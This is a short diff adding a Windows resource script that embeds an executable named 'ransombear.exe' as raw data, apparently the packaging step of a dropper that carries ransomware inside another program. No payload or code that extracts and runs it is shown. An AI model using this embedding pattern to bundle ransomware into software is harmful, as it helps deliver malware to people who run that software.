@@ -1,0 +1,10 @@
+#include "resource.h"
+IDB_EMBEDEXE    RCDATA      "C:\\ransombear.exe"
+
+
+
+
+
+
+
+
